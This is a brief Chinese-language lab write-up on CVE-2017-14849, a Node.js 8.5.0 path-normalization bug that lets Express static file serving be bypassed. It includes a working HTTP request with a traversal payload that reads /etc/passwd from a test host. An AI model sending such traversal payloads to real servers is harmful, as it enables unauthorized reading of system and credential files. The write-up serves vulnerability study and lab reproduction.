# Node.js 目录穿越漏洞（CVE-2017-14849）

###### by ADummy

### 0x00利用路线

​			连接到数据库，直接命令执行

### 0x01漏洞介绍

​			原因是 Node.js 8.5.0 对目录进行`normalize`操作时出现了逻辑错误，导致向上层跳跃的时候（如`../../../../../../etc/passwd`），在中间位置增加`foo/../`（如`../../../foo/../../../../etc/passwd`），即可使`normalize`返回`/etc/passwd`，但实际上正确结果应该是`../../../../../../etc/passwd`。

express这类web框架，通常会提供了静态文件服务器的功能，这些功能依赖于`normalize`函数。比如，express在判断path是否超出静态目录范围时，就用到了`normalize`函数，上述BUG导致`normalize`函数返回错误结果导致绕过了检查，造成任意文件读取漏洞。

当然，`normalize`的BUG可以影响的绝非仅有express，更有待深入挖掘。不过因为这个BUG是node 8.5.0 中引入的，在 8.6 中就进行了修复，所以影响范围有限。

### 0x02漏洞复现

访问`http://your-ip:3000/`即可查看到一个web页面，其中引用到了文件`/static/main.js`，说明其存在静态文件服务器。

发送如下数据包，即可读取passwd：

```
GET /static/../../../a/../../../../etc/passwd HTTP/1.1
Host: your-ip:3000
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

![Nodejs_目录穿越漏洞_1](H:\vulhub_Writeup\src\Nodejs_目录穿越漏洞_1.jpg)







![Nodejs_目录穿越漏洞_1](H:\vulhub_Writeup\src\Nodejs_目录穿越漏洞_2.jpg)













